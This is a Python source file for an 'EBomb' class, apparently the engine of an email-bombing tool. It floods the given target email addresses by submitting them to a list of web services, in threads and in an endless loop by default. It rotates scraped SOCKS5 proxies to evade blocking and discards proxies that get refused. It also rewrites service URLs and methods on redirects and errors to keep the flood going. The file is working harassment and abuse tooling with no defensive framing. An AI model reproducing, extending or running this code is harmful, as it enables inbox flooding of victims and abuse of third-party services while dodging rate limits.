from __future__ import annotations

import json
import os
import reprlib
import sys
from multiprocessing.pool import ThreadPool

import spys.me
from requests.exceptions import RequestException

from EBomb.services import *

__all__ = ('EBomb', 'Service', 'services')


class EBomb:
    def __init__(self, targets: list[str], threads_count: int = None, proxy: bool = True, forever: bool = True,
                 verbose: bool = True):
        not_verbose = not verbose
        if not_verbose:
            sys.stderr = sys.stdout = open(os.devnull, 'w')
        self._not_verbose = not_verbose

        self.targets = [j for j in [str(i).strip() for i in targets] if j]
        if not targets:
            return
        self.forever = forever
        self._max_netloc_len = max(len(serv.netloc or '') for serv in services)
        self._max_email_len = max(len(e) for e in targets)
        if proxy:
            self.__proxies = [*spys.me.Getters.get_socks5_proxies()]  # Proxies.get(limit=20, type='socks5')
            self._working_proxy = sorted(self.__proxies, key=str)[0]
        else:
            self._working_proxy = None
            self.__proxies = []
        self.proxy = proxy
        self.start(threads_count)

    @property
    def working_proxy(self):
        if not (self._working_proxy and self._working_proxy in self.proxies):
            self._working_proxy = sorted(self.proxies, key=str)[0]
        return self._working_proxy

    @property
    def proxies(self):
        if self.proxy and not self.__proxies:
            self.__proxies += spys.me.Getters.get_socks5_proxies()  # Proxies.get(limit=20, type='socks5')
        return self.__proxies

    def start(self, threads_count: int):
        print(
            "Starting... CTRL+BREAK to exit.\n"
            f"Services: {len(services)}\n"
            f"Proxy: {self.proxy}\n"
            f"Emails: {'; '.join(f'{i!r}' for i in self.targets)}\n"
            f"{'HOST':^{self._max_netloc_len}} / METH | {'EMAIL':^{self._max_email_len}}"
            f"{' |         PROXY         ' if self.proxy else ''} | RESPONSE")
        args = [(service, email) for email in self.targets for service in services]

        def _starter():
            if threads_count <= 1:
                for arg in args:
                    self.request(*arg)
                return
            with ThreadPool(threads_count) as pool:
                pool.starmap(self.request, args)

        if self.forever:
            while True:
                _starter()
        else:
            _starter()

    def request(self, service: Service, email: str):
        _proxy = self.working_proxy
        try:
            resp = service.request(email, proxies=_proxy)
            code = resp.status_code
        except RequestException as Error:
            resp = reprlib.repr(Error)
            code = None
        print(
            f'{service.netloc:^{self._max_netloc_len}} / {service.method:<4}'
            f' | {email:^{self._max_email_len}}{f" | {str(_proxy):^22}" if _proxy else ""} | {resp}')
        if service in services and code in (301, 308, 404, 405):
            pos = services.index(service)
            if code in (301, 308):
                new_loc = resp.headers.get('Location') if resp is not None else None
                if new_loc:
                    services[pos].url = new_loc
                    services[pos].method = 'GET' if code == 301 else 'POST'
                else:
                    services.pop(pos)
            elif code == 404:
                services.pop(pos)
            else:
                meth = services[pos].method
                if meth.upper() == 'GET':
                    services[pos].method = 'POST'
                else:
                    services.append(Service(service.url, 'GET'))
        if code in (None, 401, 403, 407):
            proxies = self.proxies
            if _proxy in proxies:
                proxies.remove(_proxy)

    def __del__(self):
        if self._not_verbose:
            sys.stdout = sys.__stdout__
            sys.stderr = sys.__stderr__
        with open(JSON_DB_FILE_PATH, 'w', encoding='UTF-8') as update_json:
            json.dump([{'url': serv.url, 'method': serv.method} for serv in services], update_json)
